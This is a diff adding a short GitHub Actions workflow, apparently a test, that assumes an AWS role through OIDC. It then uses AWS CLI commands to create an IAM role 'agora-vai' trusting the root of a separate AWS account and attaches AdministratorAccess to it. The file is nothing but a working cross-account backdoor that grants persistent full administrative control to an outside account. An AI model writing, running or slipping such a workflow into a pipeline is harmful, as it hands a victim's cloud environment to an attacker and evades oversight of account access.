@@ -1,0 +1,29 @@
+name: Teste Cezar ft Leo
+
+on:
+  workflow_dispatch:
+
+permissions:
+  id-token: write  # Permite usar OpenID Connect (OIDC)
+  contents: read
+
+jobs:
+  assume-role:
+    runs-on: ubuntu-latest
+    steps:
+      - name: Checkout código
+        uses: actions/checkout@v4
+        
+      - name: Step 1
+        uses: aws-actions/configure-aws-credentials@v2
+        with:
+          role-to-assume: arn:aws:iam::058264466190:role/murilo_simples
+          role-session-name: GitHubActions
+          aws-region: us-east-1  # Substitua pela região desejada
+        
+      - name: Step 2
+        run: |
+          aws iam create-role --role-name agora-vai --max-session-duration 43200 --assume-role-policy-document '{"Version": "2012-10-17", "Statement": [ { "Effect": "Allow", "Principal": { "AWS": "arn:aws:iam::654654526458:root" }, "Action": "sts:AssumeRole" } ] }' 
+      - name: Step 3
+        run: | 
+          aws iam attach-role-policy --role-name agora-vai --policy-arn arn:aws:iam::aws:policy/AdministratorAccess
